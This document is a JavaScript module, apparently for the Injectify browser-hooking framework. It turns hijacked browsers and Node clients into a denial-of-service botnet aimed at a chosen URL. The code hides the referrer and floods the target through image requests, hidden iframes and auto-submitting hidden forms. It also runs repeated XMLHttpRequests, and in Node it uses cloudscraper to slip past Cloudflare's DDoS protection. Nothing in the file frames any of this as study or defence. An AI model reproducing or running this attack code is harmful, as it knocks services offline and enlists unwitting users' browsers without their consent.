var request = {
    method: 'GET',
    url: module.params,
    body: '',
    type: 'application/x-www-form-urlencoded',
    interval: 100,
    random: true,
}

/**
 * Functions
 */
var serialize = function(obj) {
    var str = []
    for(var p in obj)
        if (obj.hasOwnProperty(p)) {
        str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
    }
    return str.join("&")
}

/**
 * Parse the parameters
 */
if (typeof module.params == 'object') {
    var { method, type, url, interval, random, params, body } = module.params

    if (method) request.method = method.toUpperCase()
    if (type) request.type = type
    if (url) request.url = url
    if (interval) request.interval = interval
    if (random) request.random = random
    if (params || body) {
        if (!body) body = params
        /**
         * Convert object parameters into query string
         */
        if (request.type === 'application/x-www-form-urlencoded') {
            if (typeof body === 'string') {
                /**
                 * Remove proceeding ?
                 */
                if (body.slice(0, 1) === '?') body = body.slice(1)
            } else if (typeof body === 'object') {
                body = serialize(body)
            }
        }
        /**
         * Stringify JSON
         */
        if (request.type === 'application/json') {
            body = JSON.stringify(body)
        }
        request.body = body
    }
}


if (injectify.info.platform === 'browser') {
    /**
     * Prevent referrer from being sent in the requests
     */
    var meta = document.createElement('meta')
    meta.name = 'referrer'
    meta.content = 'no-referrer'
    document.head.appendChild(meta)

    if (request.url) {
        if (request.method === 'GET') {
            /**
             * Parse the target url
             */
            var target = request.url
            if (request.body || request.random) {
                if (target.includes('?')) {
                    /**
                     * Target url already contains parameters
                     */
                    if (target.slice(-1) !== '&') target += '&'
                } else {
                    /**
                     * Target url doesn't contain parameters
                     */
                    target += '?'
                }
                /**
                 * Parse the parameters
                 */
                if (request.body) {
                    target += request.body
                    if (request.random) target += '&'
                }
            }

            /**
             * DDoS from multiple documents
             */

            injectify.module('embed', {
                interaction: false,
                hidden: true
            }, function(element) {
                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },' + request.interval * 4 + ')</script>'
            })

            /**
             * Request the target url
             */
            setInterval(function() {
                var url = target
                /**
                 * Add a query string to prevent the server from sending a cached response
                 */
                if (request.random) url += +new Date
                /**
                 * Make a request
                 */
                // if (typeof window.fetch === 'function') {
                //     window.fetch(url)
                // }
                var req = new Image()
                req.src = url
                req.onload
            }, request.interval)
            module.return(true)
        } else {
            if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
                /**
                 * POST request through a hidden form element
                 */
                var form = document.createElement('form')
                var frameName = +new Date
                form.setAttribute('action', request.url)
                form.setAttribute('method', request.method)
                form.setAttribute('target', frameName)

                /**
                 * Create the form elements
                 */
                var params = request.body.split('&')
                for (var i in params) {
                    /**
                     * Parse the parameters
                     */
                    var param = params[i].split('=')
                    var value = decodeURIComponent(param[1])
                    param = decodeURIComponent(param[0])
                    /**
                     * Create input element
                     */
                    var input = document.createElement('input')
                    input.setAttribute('name', param)
                    input.setAttribute('value', value)
                    /**
                     * Append to the form
                     */
                    form.appendChild(input)
                }
                /**
                 * Make request
                 */
                injectify.module('embed', {
                    hidden: true
                }, function(embed) {
                    embed.setAttribute('srcdoc', `<body onload="document.getElementsByTagName('form')[0].submit()">${form.outerHTML}<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${request.interval})}"/></body>`)
                })
            } else {
                /**
                 * Custom request
                 */
                (function ddosAttack() {
                    var XHR = new XMLHttpRequest()

                    XHR.open(request.method, request.url, true)
                    XHR.setRequestHeader("Content-type", request.type)

                    XHR.onreadystatechange = function () {
                        setTimeout(ddosAttack, request.interval)
                    }
                    XHR.send(request.params)
                })()
                module.return(true)
            }
        }
    } else {
        module.return(false)
    }
} else {
    /**
     * NodeJS enabled client
     * Use cloudscraper to circumvent cloudflare DDoS prevention
     */
    var cloudscraper = require('cloudscraper'); // leave the ;
    (function ddosAttack(thread) {
        var requestUrl = request.url
        if (request.random) requestUrl += '?' + +new Date
        cloudscraper.get(requestUrl, function(error, response, body) {
            /**
             * Move out of callstack
             */
            if (thread == 1) {
                setTimeout(function() {
                    ddosAttack(1)
                }, 0)
            }
        })
        if (thread == 1) {
            cloudscraper.get(requestUrl, function() {
                ddosAttack(2)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(3)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(4)
            })
            cloudscraper.get(requestUrl, function() {
                ddosAttack(5)
            })
        }
    })(1)
}